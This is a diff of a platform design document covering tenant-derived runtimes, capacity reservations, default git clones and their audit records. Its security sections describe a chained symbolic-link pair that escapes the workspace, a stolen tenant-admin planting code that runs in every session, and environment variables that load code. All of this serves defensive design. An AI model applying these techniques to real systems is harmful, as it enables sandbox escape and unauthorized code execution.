+**Symbolic links.** The move, a `replacePath` removal, and every other write the materializer makes run at the adapter's UID, into a tree an earlier session's agent may have written. `extractSymlink` and `ValidateSymlinkTarget` check a link's target lexically, so a restored pair such as `a/b/l -> ../..` and `src -> a/b/l/../../other/current/src` passes both and resolves outside the workspace. `overlayTree` and `writeInlineFile` then follow it. Every materializer write, move, and removal therefore opens its path with `openat2` under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`, as `scrub/resolve_linux.go` already does, and a path crossing a link fails the materialization. The writers have this hole today (DF-15, F-13.4.24), so the fix does not wait for this design.
+
+No test has run this, and the behaviour of alternates under the move was not established, because draft 0111 is absent from `proposals/`.
+
+## DR-10: Capacity reservation
+
+### What a reservation holds
+
+`maxOwnedPods` is a ceiling. A tenant holding 20 cannot go above it, and nothing ensures that 20 can start. A reservation is a floor, and three things can take capacity away from one:
+
+| What takes capacity | Control in this design | Holds against it |
+| :-- | :-- | :-- |
+| A pod ending, which frees its place until a replacement starts | The controller keeps the pool at its floor, counting warm and active pods | The pods that exist. A replacement can wait on the two rows below. |
+| Other pools' pods reaching the namespace `ResourceQuota` | The quota is split, and the reserved share is unavailable to other pods | Pod count, CPU, and memory, at quota admission. Ephemeral storage stays shared, as "The quota" states. |
+| Other pools' pods filling the nodes | A dedicated node pool, when the operator configures one | Fully with a dedicated pool. Without one, only the pods that exist hold node capacity, and a replacement competes for what is free. |
+
+### Who can turn it on
+
+Every level is off until the level above it allows it.
+
+| Setting | Set by | Effect |
+| :-- | :-- | :-- |
+| `runtimes.tenantDerivation.reservations.enabled` | Operator (Helm), false by default | While false, the chart renders neither the class nor the split, and a grant cannot allow a reservation. The controller reads the same value, so stored floors stop applying, no pod is marked, `createPod` renders no class on a marked Sandbox with no pod, the budget exemption ends, and `GET` reports the reservation as `inactive`. Pods already running continue. |
+| `runtimes.tenantDerivation.reservations.totalPods`, per resource class | Operator (Helm) | The deployment's reservable total, which sizes the reserved quota. |
+| `bases[].maxReservedPods`, per resource class | Platform admin, in the grant | The tenant's allowance, none by default. Across all grants, the allowances for a class stay at or below the total, checked under the lock that grant writes take. Across one grant, all allowances together stay at or below `maxOwnedPods`. |
+| `pool.reservedPods` | Tenant admin, or a platform admin writing for the tenant | The floor on one derived runtime's pool, at or below the allowance across the tenant's pools of that base and class. |
+
+The allowance belongs to the tenant, and the tenant divides it among its runtimes, because each pod belongs to one pool and one resource class. A tenant using only shared pools has nothing to reserve, because warm pods on a shared pool have no tenant. A derived runtime with no changes to the base gives such a tenant an owned pool.
+
+Reservations apply in the namespace the PoolScalingController manages (`--agent-namespace`), because the tree has no pool-to-namespace mapping, and a base entry whose template uses another namespace or a `microvm` profile cannot carry an allowance. §17.2 **Node isolation** fixes Kata placement, so this also leaves Kata pods out of the first version.
+
+### Mechanism
+
+**The floor.** The WarmPoolController computes the warm target of an owned pool on each reconcile, from `SandboxWarmPool.spec.reservedPods` and its own Sandbox list, as `max(spec.minWarm, reservedPods - active)`, where `spec.minWarm` is the `warmCount` the PoolScalingController rendered, or 0 under a stop, and passes it to `plan.Compute` as both `MinWarm` and `MaxWarm`. `warmTarget` clamps to `MaxWarm`, so raising `MinWarm` alone would have no effect, and setting both keeps the pinned idle bound at zero, as DR-5 needs. `reconcilePDB` and the pool conditions read the same target, because they read `spec.minWarm` today and a reserved pod would get no disruption budget. `active` counts `claimed` and `reserved` pods, and leaves out `draining` and `failed`, which are unusable. It cannot be computed in the PoolScalingController, which syncs every 30 seconds while the WarmPoolController reacts to Sandbox events at once, because a stale target creates pods the floor does not need. A pool with `reservedPods: 5` and `warmCount: 1` runs 5 warm pods when idle, 2 warm pods with 3 sessions, and 1 warm pod with 5 or more sessions.
+
+The floor applies after the scaling formula, so low demand or a `scaleToZero` window cannot take the pool below it. `resolveWarm` writes `MinWarm: 0` for both a force-zero and a `scaleToZero` window, so the controller cannot tell them apart from that value. The PoolScalingController therefore renders `spec.reservedPods` as 0 on `ForceZeroMinWarm` and when the pool row has `DrainingSince` set, because the `drain` route sets only that column, and as the stored value otherwise. `drainAndDeleteWarmPool` bypasses `syncWarmPool`, so it writes the field itself. A non-empty `warm_stop_reasons` maps to `ForceZeroMinWarm`, so a suspended tenant, a retired base, and a security forbid still drain the pool, and so does the tenant's own experiment pausing its variant pool.
+
+**The quota.** With reservations on, the chart renders, in the `--agent-namespace` alone, a `PriorityClass` named `lenny-reserved`, with value 0 and `preemptionPolicy: Never`, and splits `lenny-agent-quota` through the `PriorityClass` quota scope. A new `lenny-agent-reserved-quota` matches that class and limits `pods` to the sum of `totalPods`. Limiting CPU and memory there would need the total requests of a rendered pod, and `applyResources` stamps a class's requests on every container, so a pod's total depends on its sidecars and RuntimeClass overhead. A limit computed from the class alone would run out at half the stated pods or sooner. The grants and the class sizes bound what those pods request, so a `pods` limit is enough for the reserved share. `lenny-agent-quota` matches every other pod, and it holds the namespace's pod count less `totalPods`, and its CPU and memory less `reservations.reservedRequests`, in which the operator states what to set aside. Kubernetes refuses `requests.ephemeral-storage` under a `PriorityClass` scope (`IsResourceQuotaScopeValidForResource` accepts `pods` and the CPU and memory resources alone), so a third quota, `lenny-agent-storage-quota`, carries it with no scope, at the namespace's value. Other pools can therefore use up storage and refuse a reserved pod, and `TenantReservationUnmet` reports it. An operator sizes that value with the reserved pods included. Nothing in the tree can compute a rendered pod's total, so this figure is the operator's statement, and documentation gives the arithmetic. If it is wrong, the namespace total is misstated, and no reserved pod is refused.
+
+**Which pods are reserved.** `priorityClassName` is immutable, so the WarmPoolController decides when it creates a Sandbox: while the pool has fewer than `reservedPods` non-terminal Sandboxes marked `spec.reserved`, the new one is marked and its pod takes the class. Later pods use the general quota. Two more rules keep the floor:
+
+- The controller drains unmarked idle pods before marked ones.
+- `createPod` retries a rejected pod indefinitely, and `plan.Compute` counts that Sandbox as warm. While marked Sandboxes are below `reservedPods`, the controller deletes an unmarked Sandbox in `warming` that has no pod, and creates a marked one. Deleting one that has just created its pod loses only a warming pod, because `claimer.go` claims only `idle` pods. Terminating Sandboxes do not count as marked. Otherwise a full general quota would leave a stuck Sandbox standing in for a pod the reserved quota could start. The planner gains this action, and the rule converges because marks only rise until they reach `reservedPods`.
+
+The controller reads Sandboxes through its cached client, so a stale count can over-mark a pod. The reserved quota then refuses it, and the next reconcile corrects the count.
+
+**Nodes.** A template pool can set `reservedPlacement`, a `nodeSelector` and `tolerations` applied to reserved pods alone. The operator taints that node pool, as §17.2 does for Kata nodes, so that no other pod lands there. The field is platform-written and copied, and the tenant cannot set it. A template write refuses it on a runtime with `workspaceTier: T4`, whose placement `applyT4NodeIsolation` fixes, and refuses a toleration naming the `lenny.dev/isolation` key, which would admit pods to Kata nodes. Without it, `GET` and posture report `placementConfigured: false`. The field states what was configured. Preflight checks that a node carries the selector, and the size of that node pool remains the operator's responsibility.
+
+**No preemption and no priority.** A reserved pod never evicts another pod, and its class has value 0, so it has the priority of every other pod. Agent pods carry no priority class today, so a preempting pod's victims would include other tenants' running sessions, and §28.5.6 states that a preemption bypasses the eviction API and opens no `CH-ADMISSION` channel, so the checks on that channel do not run. A raised value would also cause kubelet node-pressure eviction to prefer other tenants' pods and platform pods over one tenant's idle reserved pods. When nodes are full, a reserved pod waits for free capacity or the cluster autoscaler.
+
+### Budget
+
+`reservedPods` enters the one figure under "Bounds". A pool is charged `reservedPods + warmCount` from the moment the reservation is written, because the warm target keeps `warmCount` warm once sessions have used the reservation. A claim within the reservation leaves T unchanged, so it always passes, and a claim beyond it raises T like any other. With `warmCount` at least 1, a reservation stays below `maxOwnedPods`.
+
+### Changes after a write
+
+- A grant write lowering an allowance or `maxOwnedPods` lowers allowances and `reservedPods` in the same transaction, in name order, until the allowances and T fit, and `runtime.base_changed` goes out. Excess marked pods that are idle drain, and active ones end with their sessions.
+- Those active pods still hold reserved quota. A grant write raising any allowance therefore counts live marked pods above each tenant's allowance, and it is refused while allowances plus that overrun would pass `totalPods`.
+- A `totalPods` lowered below what grants allow does not reach the database. Marked pod creation then fails at quota admission, and `PoolScaleoutBlockedByQuota` fires. Preflight compares the two where it can read them.
+- `DELETE` releases the runtime's reservation with its pool.
+
+### Reporting
+
+`GET /v1/admin/derived-runtimes/{name}` reports `reservation`, with `requested`, `held`, `state`, `placementConfigured`, and `blockedBy`. A new metric reports requested and held pods per pool, under the cardinality statement in §16, and a `TenantReservationUnmet` alert fires when `held` stays below `requested` past a Helm-set period, whatever the cause, so a refusal at RuntimeClass admission or a missing class is reported as well as a quota refusal. Posture's `gates` section reports the allowance and its use. `lenny_warmpool_idle_pod_minutes` already reports idle pods per pool, so a tenant's reserved idle cost is attributable to it.
+
+### What it costs and what it leaves open
+
+- The reserved share of the quota is unavailable to every other pool, including while a tenant has not used its allowance. This is the operator's cost at the Helm value.
+- A dedicated node pool costs idle nodes for the whole reserved total.
+- A tenant pays for reserved pods while they sit idle, whether billing reads that or the operator charges another way.
+- A node failure reduces `held` until replacements start, and a replacement takes the pod start time. A reservation with no dedicated nodes can wait longer.
+- The floor counts pods, and a one-session pool's `reservedPods` equals sessions. A concurrent pool's floor serves more sessions per pod.
 
 ## DR-8: Interactions
 
@@ -451,15 +618,15 @@ A tenant-derived runtime can be a path's target under decision 14. The child run
 "derivedRuntimes": { "forbid": ["all"] }
 ```
 
-The values are `all`, `setupCommands`, `workspaceFiles`, `recycle`, and `concurrency`. As with the other constraints, the platform grants the class and the tenant's security team can still forbid it. Stopping tenant code takes both `setupCommands` and `workspaceFiles`, because a file is code. `verbatimClientFiles: forbid` also forbids `workspaceFiles`, because both put arbitrary content in the pod, and a `security-admin` who set it expects that channel closed.
+The values are `all`, `setupCommands`, `workspaceFiles`, `gitClones`, `floatingCloneRefs`, `reservation`, `recycle`, and `concurrency`. As with the other constraints, the platform grants the class and the tenant's security team can still forbid it. Stopping tenant code takes `setupCommands`, `workspaceFiles`, and `gitClones`, because a file and a clone are code. `verbatimClientFiles: forbid` also forbids `workspaceFiles` and `gitClones`, because each puts arbitrary content in the pod, and a `security-admin` who set it expects that channel closed.
 
 - A violating write answers `422 GUARDRAIL_VIOLATION`.
 - A tightening sets `suspendedBy` on each non-compliant derived runtime. A suspended runtime leaves discovery, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and its pool stops warming and drains. Running sessions continue, under the residual "A stored plan outlives a stop".
 - Removing a forbid is a weakening, with SO-2's delay. Creating a derived runtime is not a weakening by itself (decision 9).
 
-**Posture.** A new `derivedRuntimes` section reports each runtime's name, base, `baseStatus`, count and digest of default commands and files, `maxConcurrentSessions`, recycling, last writer, and last change. `gates` reports the grant, its limits, and current use. `pools` already reports `ownerTenant`.
+**Posture.** A new `derivedRuntimes` section reports each runtime's name, base, `baseStatus`, count and digest of default commands and files, each default clone's URL and ref and whether the ref is a full commit, `reservedPods`, `maxConcurrentSessions`, recycling, last writer, and last change. `gates` reports the grant, its limits, and current use. `pools` already reports `ownerTenant`.
 
-**Records.** `admin.runtime.updated` carries `changedFields` alone today. The new events, `admin.derived_runtime.created`, `.updated`, and `.deleted`, carry the owner, the base, the version, the full text of each setup command, each file's path and digest, and before and after values for `sessionPolicy` and the pool's `warmCount`. Command text belongs in the record, because it is what ran in every session. File content stays out, because a tenant can place sensitive data there against the documentation, and the composed plan already holds it per session. `derivation-grant` writes and retirement emit their own events. A `platform-admin`'s write to a tenant-derived runtime uses the same route and is mirrored under SO-4a.
+**Records.** `admin.runtime.updated` carries `changedFields` alone today. The new events, `admin.derived_runtime.created`, `.updated`, and `.deleted`, carry the owner, the base, the version, the full text of each setup command, each file's path and digest, each default clone's URL, ref, and path, and before and after values for `sessionPolicy` and the pool's `warmCount` and `reservedPods`. Command text belongs in the record, because it is what ran in every session. File content stays out, because a tenant can place sensitive data there against the documentation, and the composed plan already holds it per session. `derivation-grant` writes and retirement emit their own events. A `platform-admin`'s write to a tenant-derived runtime uses the same route and is mirrored under SO-4a.
 
 ## Configuration by scope
 
@@ -469,9 +636,12 @@ The values are `all`, `setupCommands`, `workspaceFiles`, `recycle`, and `concurr
 | `runtimes.tenantDerivation.maxOwnedPodsTotal` | The limit on the sum of every grant's `maxOwnedPods`. | Deployment | Platform admin (Helm) |
 | `runtimes.tenantDerivation.baseRetirementNoticeSeconds` | The minimum notice for a retirement. 2592000 by default, which is a judgment. | Deployment | Platform admin (Helm) |
 | `runtimes.tenantDerivation.maxWorkspaceDefaultsBytes` | The size bound on a derived runtime's default files. | Deployment | Platform admin (Helm) |
-| `derivation-grant` (`namePrefix`, `maxRuntimes`, `maxOwnedPods`, and `bases[]` with `allowWorkspaceFiles`, `allowSetupCommands`, `ownedOverlays`, and `retireAt`) | What the tenant can derive from, under which template, with which defaults and overlays, and up to what limits. | Tenant | Platform admin (admin API) |
-| Template pool | The source of every copied pool setting. | Pool | Platform admin |
-| Derived runtime fields and `pool` block | Under "Fields" and "Template copy". | Runtime in a tenant | Tenant admin, or a custom role with `manage_derived_runtimes` |
+| `runtimes.tenantDerivation.maxDefaultGitClones` | The limit on a derived runtime's default clones. | Deployment | Platform admin (Helm) |
+| `runtimes.tenantDerivation.reservations.enabled` | Whether reservations exist at all. False by default. | Deployment | Platform admin (Helm) |
+| `runtimes.tenantDerivation.reservations.totalPods` and `reservedRequests` | The reservable pods per resource class, which limits the reserved quota, and the requests set aside from the general quota. | Deployment | Platform admin (Helm) |
+| `derivation-grant` (`namePrefix`, `maxRuntimes`, `maxOwnedPods`, and `bases[]` with `allowWorkspaceFiles`, `allowSetupCommands`, `allowGitClones`, `maxReservedPods`, `ownedOverlays`, and `retireAt`) | What the tenant can derive from, under which template, with which defaults and overlays, and up to what limits. | Tenant | Platform admin (admin API) |
+| Template pool | The source of every copied pool setting, including `reservedPlacement`. | Pool | Platform admin |
+| Derived runtime fields and `pool` block | Under "Fields", "Template copy", and DR-10. | Runtime in a tenant | Tenant admin, or a custom role with `manage_derived_runtimes` |
 | `derivedRuntimes` in the security record | What the tenant's security team forbids. | Tenant | `security-admin` |
 | Environment selector | Whether an environment admits the runtime. | Environment | Tenant admin |
 
@@ -495,18 +665,26 @@ The response warns that `payments` admits the runtime. The controller creates tw
 
 **A raised concurrency value.** The template serves 20 concurrent sessions. Alice asks for 25 and gets `422 INVALID_DERIVED_RUNTIME`, with `details.field: sessionPolicy.maxConcurrentSessions`. A `platform-admin` raising the template's value is the path to more.
 
-**A budget reached.** `acme` holds `maxOwnedPods: 20`, with warm counts summing to 8 and 11 active pods. Bob's claim passes, because 19 is below 20, and makes 12 active. Carol's claim answers `429 QUOTA_EXCEEDED`, though warm pods sit idle. With those 12 active pods, a write taking the warm sum from 8 to 9 answers `422 DERIVATION_BUDGET_EXCEEDED`, with the current use, because 21 passes 20. A write lowering the sum passes.
+**A budget reached.** `acme` holds `maxOwnedPods: 20`, with warm counts summing to 8 and 11 active pods, so T is 19. Bob's claim takes T to 20, which the bound allows. Carol's claim would take it to 21, so it answers `429 QUOTA_EXCEEDED`, though warm pods sit idle. With those 12 active pods, a write taking the warm sum from 8 to 9 answers `422 DERIVATION_BUDGET_EXCEEDED`, with the current use. A write lowering the sum passes.
 
 **A base retired.** An operator retires `chat` with 30 days' notice. `acme`'s audit chain and SIEM destination receive `runtime.base_changed`, and `GET` shows `baseStatus: retiring`. Sessions continue. After the date, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, the owned pool drains, and running sessions finish under their limits. Alice has moved `payments` to another base by then.
 
-**A stolen `tenant-admin`.** A grant with neither flag refuses the attacker's default file and command. Under a grant with `allowWorkspaceFiles`, the attacker writes a `requirements.txt` that a base command installs, or a hook the runtime loads, and that code runs at the agent UID in each new session. It can read a `file` token and use an `inject` token. The audit event carries the file's path and digest, and an SO-3 destination receives it at once. `derivedRuntimes.forbid` with `workspaceFiles` and `setupCommands` refuses the write. Otherwise an operator sets the flag false, which makes the runtime `incompatible` for new sessions, or a `security-admin` adds the forbid. The composed plan on each session row records which sessions ran it.
+**A default clone.** The grant sets `allowGitClones`. Alice adds `github.com/acme/agent-skills` at `main`, under a `required` pool, and the write warns that the ref floats and that repository access now decides who can use the runtime. Bob holds a link and read access, so his session binds the commit `main` names at that moment, and his plan records it. Carol has a link and no access, so her create answers `USER_REPOSITORY_ACCESS_DENIED` with `details.source: runtimeDefault` and `path: skills`, no repository name, and no pod claimed. Dave has no link and gets `USER_LINK_REQUIRED`. A later push to `main` reaches new sessions with no write at Lenny, so `acme`'s `security-admin` sets `floatingCloneRefs` in `forbid`, and the runtime is suspended until Alice pins a commit.
+
+**A reservation.** The operator sets `reservations.enabled` and `totalPods: { small: 100 }`, with `reservedPlacement` on the template. A platform admin gives `acme` `maxOwnedPods: 20` and `maxReservedPods: { small: 10 }`. Alice sets `reservedPods: 10` and `warmCount: 2` on `acme--chat-payments`, which takes T to 12, so 10 warm pods start on the dedicated nodes. A burst on other pools fills `lenny-agent-quota` and its own nodes, and `acme`'s pods are unaffected. With all 10 in use, two more warm pods start under the general quota if it has room, and further claims can take the tenant to 20 pods. An administrator of `globex` with no allowance who sets `reservedPods` gets `422 DERIVATION_BUDGET_EXCEEDED`.
+
+**A stolen `tenant-admin`.** A grant with no default flag refuses the attacker's default file, command, and clone. Under a grant with `allowWorkspaceFiles`, the attacker writes a `requirements.txt` that a base command installs, or a hook the runtime loads, and that code runs at the agent UID in each new session. It can read a `file` token and use an `inject` token. The audit event carries the file's path and digest, and an SO-3 destination receives it at once. `derivedRuntimes.forbid` with `workspaceFiles`, `setupCommands`, and `gitClones` refuses the write. Otherwise an operator sets the flag false, which makes the runtime `incompatible` for new sessions, or a `security-admin` adds the forbid. The composed plan on each session row records which sessions ran it.
 
 ## Residual risks
 
 - **A tenant admin's reach.** A `tenant-admin` can write defaults that run in every session on a derived runtime, including in an environment it does not belong to, because `tenant-scoping-identity-design.md` already leaves it able to add itself as a member. Environments give no boundary against a tenant admin. No control bounds what a default file does once a base command or the runtime reads it, and commands within an allowlist can still do what the allowed tools do.
 - **No per-session consent.** A user selecting a runtime receives its defaults. The plan on `GET /v1/sessions/{id}` shows them after the fact.
-- **Shared capacity.** Budgets bound what a tenant holds. They do not reserve nodes. Tenant-owned pods share nodes and the namespace `ResourceQuota` with every other pool, and a quota reached by any pods stops pods of all pools, which is true of session load today. A `maxOwnedPodsTotal` set below the quota limits this for owned pools alone. The bound is a pod count, so a tenant using `large` holds more than one using `small`.
+- **Shared capacity.** Budgets bound what a tenant holds, and only DR-10 sets a floor. Tenant-owned pods with no reservation share nodes and the namespace `ResourceQuota` with every other pool, and a quota reached by any pods stops pods of all pools, which is true of session load today. A `maxOwnedPodsTotal` set below the quota limits this for owned pools alone. The bound is a pod count, so a tenant using `large` holds more than one using `small`.
 - **Pod-count overshoot.** The claim check is not serialized, so concurrent claims can pass `maxOwnedPods`.
+- **Reads a user did not ask for.** Under a `required` pool, a default clone reads a repository the session user can read, on the authority of that user's link, which a tenant admin chose and the user did not name. The user's choice of runtime is the only consent, and the plan shows it after the fact. A default command or base command can then send that content wherever the session's egress allows.
+- **Pushers run code.** Whoever can push to a default clone's floating ref runs code in every new session on the runtime, as DR-9 states, until a forbid or a pinned commit applies.
+- **A default clone can lock users out.** A repository removed from the allowlist or a revoked permission refuses new sessions on the runtime for the users affected.
+- **Reserved capacity with shared nodes.** Without `reservedPlacement`, a replacement for a reserved pod competes for free node capacity, so a full cluster delays it, and the alert reports it.
 - **Warm pods after an overlay row drops.** No pod roll is triggered, so warm pods carrying a dropped `caBundle` or `clientProfile` serve new sessions until they are used up.
 - **Deleting a base's `Runtime` resource.** The RuntimeReconciler's finalizer soft-deletes the row and bypasses notice and the dependents check. An operator who deletes the resource directly strands tenant-derived runtimes at once, as `retired`.
 - **A stored plan outlives a stop.** A grant flag set false, a forbid, or a suspension stops new sessions. §7.3 step 3e rebuilds a session with no checkpoint from its stored plan and runs the plan's setup commands, so an attacker's default runs again in that session. An emergency retirement with `force: true` ends such sessions. Filtering on rebuild would need a per-command source on the stored plan, and that is additive.
@@ -538,12 +716,13 @@ These exist independent of this design. Each is filed in `BUILD-GAPS.md` under t
 | DF-12 | F-5.1.32 for the merge table, F-10.2.43 for the quota row | Low | §5.1's merge table omits `workspaceTier`, `sdkWarmBlockingPaths`, `archivePolicy`, `toolCapabilityOverrides`, and `description`. A derived payload's `sdkWarmBlockingPaths` is accepted and discarded. §10.2's matrix gives `tenant-admin` "Manage quotas", and the tenant update route that holds `max_concurrent_sessions` uses `requireAdmin`. | `RuntimePayload`, `Merge`, `routes.go`. Read. | DR-4 for the table. The quota row is not in this design. |
 | DF-13 | F-8.3.13 | Medium | The delegation policy deletion guard ignores the tenant. Policies are keyed on `(tenant_id, name)`, and `delegationPolicyRuntimeDependents` takes a name alone, so a platform runtime referencing `strict` blocks every tenant's delete of its own `strict`, and the answer names that runtime to a tenant with no grant on it. | `delegationPolicyRuntimeDependents`, `handleDeleteDelegationPolicy`, which a `tenant-admin` reaches and which runs the guard before reading the policy, and migration `0054`. Read. | DR-4 |
 | DF-14 | F-17.6.27 | Medium | §17.6 states that a seeded runtime or pool can carry `tenantAccess`, and nothing implements it. `BootstrapRequest` has no such field, and neither bootstrap handler makes a grant call. A seed therefore holds no access rows. That is harmless while DF-2 stands, and it stops every session once DF-2 closes. | `BootstrapRequest`, `bootstrap.go`, `bootstrap_resources.go`, and `tests/testinfra/kind/install.sh`. `pkg/embedded/stack/runtimes.go` grants runtimes alone. Read. | DR-1 |
+| DF-15 | F-13.4.24 | High | The adapter's materializer follows symbolic links in a restored tree. `extractSymlink` and `ValidateSymlinkTarget` check the target lexically, so a chained link passes both and resolves outside the workspace or into `/run/lenny`, and `writeInlineFile`, `writeUploadFile`, `makeDir`, and `overlayTree` write through it at the adapter's UID. An agent can plant the chain, `ArchiveTree` records it, and a derive restores it ahead of the plan's sources. | `extract.go`, `upload.go`, `materialize.go`, `tree.go`. `scrub/resolve_linux.go` shows the safe form. Read. | Its own proposal, or EG's proposal 3. |
 
 F-5.2.67 (High) stands for pools, and this design adds that the same gate covers `runtimeRef`, `isolationProfile`, `sessionPolicy`, warm count, and `drain`. DR-1 refuses all of them to `tenant-admin` on a shared pool. EG-9's tenant pool overlay remains the path for egress and git settings.
 
 ## Changes requested of other design documents
 
-None of these edits has been made.
+Revision 8 applied these edits to the documents named, which now carry them at the revisions cited in the status line. The table remains as the record of why each was made.
 
 | Document | Request | Why |
 | :-- | :-- | :-- |
@@ -557,6 +736,8 @@ None of these edits has been made.
 | The same | Under "Reserved for other designs", add `owner_tenant_id`, `template_pool`, and `pod_runtime_ref` on the pool row. | Stored format. |
 | The same | Under "Tenant pool overlays", for a pool a grant entry names and for its owned pools: a write lowering a `tenantOverride` flag succeeds, the extending part of any tenant's overlay stops applying, and `runtime.base_changed` goes out. The owned-only rows read as `none` unless the grant entry lists them. | The current refusal lets an overlay block a platform write, against R6, and a copied flag opens rows the operator did not consider. |
 | The same | Under "Client proxy profile", limit a tenant-set environment variable to an allowlist of names the chart ships, the proxy and trust variables. | A proxy profile's variable otherwise sets what the runtime loads, and a denylist stays open: `LD_PRELOAD`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT` all run code. No such rule exists there. |
+| `user-git-identity-design.md` | Under "Declared repositories" and "When the check runs": a default clone is a declared source once composed. State that "before any pod claim" does not hold for a plan bound at finalize, because the create-time claim comes first. | DR-9 relies on the first, and the second is what the code does. |
+| `egress-and-git-design.md` | State how the adapter clones into a target that already holds files, and that a composed default clone counts as a plan source. | "Not verified" under DR-9. |
 | `security-oversight-design.md` | Add `derivedRuntimes` to the SO-2 record, the weakening list, and the "Enforcement" table. Add the `derivedRuntimes` section to "Posture" and the grant to `gates`. State that `verbatimClientFiles: forbid` also forbids `workspaceFiles`. | R7. |
 
 `user-credential-delivery-design.md` needs no edit. Its refusal on `maxConcurrentSessions > 1` reads the owned pool's value as it reads any pool's, and its attacker row for a tenant admin able to change `workspaceDefaults` already states this reach.
@@ -564,10 +745,13 @@ None of these edits has been made.
 ## Specification sections affected
 
 - §4.2 **Multi-tenancy:** and the classification table: the tenant-scoped row, and the removal of `tenant-admin` writes on platform-global records.
-- §4.6.1 and §4.6.3: the owner label at creation and `podRuntimeRef`.
+- §4.6.1 and §4.6.3: the owner label at creation, `podRuntimeRef`, the warm target under a reservation, and `spec.reserved`.
 - §4.7.10 **Runtime supervisor.**: running setup commands at the agent UID, on the existing `CH-SUPERVISE`.
 - §5.1 **Inheritance Rules**, **Normative Merge Algorithm**, and **Derived Runtime Instantiation**: the missing rows, the live merge for tenant-derived runtimes, the fallback statement, and what a runtime's `sessionPolicy` does. **Base runtime mutability**: the tenant-derived exception. **`publishedMetadata` Field**: the visibility rule. Name grammar.
 - §5.2 **Tenant pinning:**, **Pinned idle inventory.**, and **Pool Taxonomy**: owned pools and `lenny.dev/served`.
+- §7.1: the order of composition and checks, the check ahead of a create-time claim, and **Derive restore semantics:** for `replacePath`.
+- §14, the `gitClone` row and the schema: `replacePath` as a read-only field. §4.7 and §28: the materialization message carrying it.
+- §7.4 and §13.4: every materializer write, move, and removal resolves beneath the workspace with no symbolic links.
 - §7.5 **Command policy:** and **Security model:**: the scope of the exemption, and where commands run.
 - §8.3: the intersection stated in code terms.
 - §10.2: the permission matrix, the new permission, and **Runtime and pool scoping clarification**.
@@ -578,11 +762,12 @@ None of these edits has been made.
 - §11.7: the new events.
 - §12.3, §12.8, and §12.9: the tables, erasure, and classification.
 - §13.2.6: an owned pool's profile comes from its template.
-- §14.1 **Runtime workspace defaults.**: tenant-written commands get no exemption, and rule 4 does not apply where the tenant view is wired.
+- §14.1 **Runtime workspace defaults.**: tenant-written commands get no exemption, rule 4 does not apply where the tenant view is wired, default clones compose as `gitClone` sources, and **Path collision rule** gains `replacePath` and states that a plan path crossing a symbolic link fails the session.
 - §15.1: the routes, the codes, the deletion rules for a runtime and a tenant, `retire`, and the removal of the `tenant-admin` clauses on `PUT` rows.
-- §16: bounds and base-status metrics, with label cardinality stated.
+- §16: bounds, base-status, and reservation metrics, with label cardinality stated, and `TenantReservationUnmet`.
 - §17.2: the label webhooks.
-- §17.6 and §17.8.2: the Helm values, the default for an absent `tenantAccess` on the seed, and preflight's sizing with `maxOwnedPodsTotal`.
+- §17.2: the split quota, the `PriorityClass`, and the taint on a reserved node pool.
+- §17.6 and §17.8.2: the Helm values, the default for an absent `tenantAccess` on the seed, and preflight's sizing with `maxOwnedPodsTotal` and `reservedPods`.
 - §24: `lenny-ctl` commands.
 
 ## Proposals and dependencies
@@ -594,6 +779,8 @@ None of these edits has been made.
 | DR-3 | Setup command identity | Runs setup commands at the agent UID through the runtime supervisor on sidecar pods. Closes DF-4 for the adapter's identity. |
 | DR-4 | Tenant runtime records | The table, tenant-view interface and the holders that change type, `ErrTenantScopedName`, grant, prefix, permission, routes, field rules, Helm values, erasure, and classification. Closes DF-13, the table half of DF-12, and DF-7 for tenant-derived runtimes. |
 | DR-5 | Owned pools | The template copy and its propagation, `ownedOverlays`, `lenny.dev/served`, the bounds, the PoolScalingController clamp, tenant operations, and tenant suspension and deletion. |
+| DR-9 | Default git clones | The field, the write checks, the composition order on every path, the refusal details, and the guardrail values. |
+| DR-10 | Capacity reservation | The Helm values, allowance, `reservedPods`, warm target, split quota, `PriorityClass`, `reservedPlacement`, budget figure, reporting, and alert. |
 | DR-6 | Base lifecycle | The live merge against base and grant, `baseStatus`, the outbox, retirement, emergency, and the deletion rule. Closes DF-8. |
 | DR-7 | Oversight and records | The guardrail, posture, and events. |
 | DR-8 | Interactions | Environment warnings, the experiment re-check on the final row, and delegation resolution. |
@@ -609,6 +796,8 @@ These land early, because a stored format, a wire contract, or a shipped enforce
 | DR-4 (tenant defaults step, files and commands) | DR-3 | Neither a tenant command nor a base command reading a tenant file can run at the adapter's UID |
 | DR-5 | DR-2, DR-4, and EG-9 | The pod path, the records, and `ownerTenantId` with the label rule |
 | DR-6 | DR-4 and DR-5 | The merge and pools it acts on |
+| DR-9 | DR-3, DR-4, DR-5, and the egress design's pod-side clone | A clone is code, it needs an owned pool's git path, and F-14.1.37 means no `gitClone` works in a deployed image today. A `required` pool also needs UG-2. |
+| DR-10 | DR-5 | The owned pool and its budget |
 | DR-7 | DR-4, and SO-1 and SO-2, whichever lands second adding the case | The role and the record |
 | DR-8 | DR-4, TS-1, and TS-3 | The checks on the final row |
 
@@ -620,14 +809,14 @@ Each proposal carries the documentation for its own surface. Pages state behavio
 
 | Page | Change |
 | :-- | :-- |
-| `operator-guide/tenant-derived-runtimes.md` (new) | Owns the grant, template pools, budgets, retirement, emergency, capacity headroom, and the costs above. |
+| `operator-guide/tenant-derived-runtimes.md` (new) | Owns the grant, template pools, budgets, reservations and how to size them, retirement, emergency, capacity headroom, and the costs above. |
 | `operator-guide/multi-tenancy.md` | Corrects what `runtime_tenant_access` does, removes tenant writes on shared records, and links the new page. |
 | `getting-started/concepts.md`, **Derived runtimes** | Corrects the restrict-only statements, and states that a derived runtime needs a pool. |
 | `runtime-author-guide/runtime-configuration.md` | States where setup commands run after DR-3, and which fields a tenant can set. |
 | `api/admin.md`, the error reference, and `reference/configuration.md` | The routes, codes, and Helm values. |
 | `operator-guide/lenny-ctl.md` | The new commands. |
 | `reference/glossary.md` | Entries for tenant-derived runtime, owned pool, template pool, and derivation grant. |
-| "Tenant configuration" in the `egress-and-git-design.md` chapter | How a tenant admin creates a derived runtime for an environment, and that default files hold no secrets. |
+| "Tenant configuration" in the `egress-and-git-design.md` chapter | How a tenant admin creates a derived runtime for an environment, that default files hold no secrets, how to choose a default clone's ref, and how to read a reservation's status. |
 
 ## Tests
 
@@ -644,18 +833,23 @@ Each proposal turns this list into tests with `// spec:` annotations at the tier
